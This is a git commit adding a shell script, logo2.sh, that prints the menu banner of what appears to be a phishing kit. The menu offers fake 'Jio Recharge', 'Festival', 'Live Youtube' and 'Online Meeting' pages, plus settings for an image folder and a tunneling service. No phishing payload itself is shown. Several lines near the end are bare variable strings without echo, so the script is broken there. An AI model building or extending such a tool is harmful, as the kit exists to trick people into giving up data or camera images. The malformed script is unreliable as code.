b8effc33c88ac3c4fd7786eecf6b56c0cc6b259e
Online Hacking <45653647+OnlineHacKing@users.noreply.github.com>
2022-04-21 07:39:52 +0530

    Create logo2.sh

---
+++ OnlineHacking/logo2.sh
@@ -0,0 +1,22 @@
+echo ""
+echo -e "\e[1;96m< < ==================== < Phishing Page > ==================== > >\e[m "
+printf " \e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m " 
+echo " "
+printf "\e[1;31m[\e[0m\e[1;92m01\e[0m\e[1;31m] \e[0m\e[1;37;44m Jio Recharge \e[0m       \e[1;31m[\e[0m\e[1;92m02\e[0m\e[1;31m] \e[0m\e[1;91;107m Festival \e[0m   "
+echo
+printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"     
+echo
+printf "\e[1;31m[\e[0m\e[1;92m03\e[0m\e[1;31m] \e[0m\e[1;37;41m Live Youtube \e[0m       \e[1;31m[\e[0m\e[1;92m04\e[0m\e[1;31m] \e[0m\e[1;34;103m Online Meeting \e[0m   "
+echo " "
+echo -e "\e[1;96m< < ==================== < Tool Setting > ==================== > >\e[m "
+echo ""
+
+${cyan}[${white}i${cyan}] ${yellow}Change Image Directory (current: ${red}${FOL}${yellow})
+${cyan}[${white}t${cyan}] ${yellow}Change Default Tunneler (current: ${red}${TN}${yellow})
+${cyan}[${white}x${cyan}] ${yellow}About
+${cyan}[${white}m${cyan}] ${yellow}More tools
+${cyan}[${white}0${cyan}] ${yellow}Exit${blue}
+
+echo " "
+echo -e "\e[1;96m< < < ============================================================ > > >\e[m "
+echo ""
